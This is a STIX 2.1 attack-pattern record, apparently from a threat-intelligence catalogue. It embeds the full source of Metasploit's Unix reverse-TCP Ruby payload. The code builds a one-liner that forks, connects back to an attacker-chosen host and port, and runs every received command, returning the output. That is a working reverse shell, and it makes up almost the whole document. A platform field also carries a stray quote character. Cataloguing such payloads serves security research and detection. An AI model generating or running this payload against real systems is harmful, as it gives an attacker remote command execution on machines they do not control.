{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6e5970f1-d496-40ae-861c-dead6a242176",
    "created": "2024-08-14T16:33:19.313835Z",
    "modified": "2024-08-14T16:33:19.313838Z",
    "name": "Unix Command Shell, Reverse TCP (via Ruby)",
    "description": "Connect back and create a command shell via Ruby",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/unix/reverse_ruby.rb",
            "external_id": "reverse_ruby.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 133\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n     'Name'        => 'Unix Command Shell, Reverse TCP (via Ruby)',\n     'Description' => 'Connect back and create a command shell via Ruby',\n     'Author'      => 'kris katterjohn',\n     'License'     => MSF_LICENSE,\n     'Platform'    => 'unix',\n     'Arch'        => ARCH_CMD,\n     'Handler'     => Msf::Handler::ReverseTcp,\n     'Session'     => Msf::Sessions::CommandShell,\n     'PayloadType' => 'cmd',\n     'RequiredCmd' => 'ruby',\n     'Payload'     => { 'Offsets' => {}, 'Payload' => '' }\n    ))\n    register_advanced_options(\n      [\n        OptString.new('RubyPath', [true, 'The path to the Ruby executable', 'ruby'])\n      ]\n    )\n  end\n\n  def generate(_opts = {})\n    vprint_good(command_string)\n    return super + command_string\n  end\n\n  def command_string\n    lhost = datastore['LHOST']\n    lhost = \"[#{lhost}]\" if Rex::Socket.is_ipv6?(lhost)\n    \"#{datastore['RubyPath']} -rsocket -e 'exit if fork;c=TCPSocket.new(\\\"#{lhost}\\\",\\\"#{datastore['LPORT']}\\\");while(cmd=c.gets);IO.popen(cmd,\\\"r\\\"){|io|c.print io.read}end'\"\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}